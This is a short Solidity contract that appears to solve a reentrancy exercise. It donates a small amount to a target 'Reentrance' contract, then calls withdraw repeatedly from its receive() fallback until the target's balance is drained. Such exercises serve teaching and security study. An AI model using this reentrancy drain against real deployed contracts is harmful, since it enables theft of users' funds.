// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        Reentrance(contractAddress).donate{value: 1}(address(this));
        Reentrance(contractAddress).withdraw();
    }

    receive() external payable {
        if (address(contractAddress).balance >= 1) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
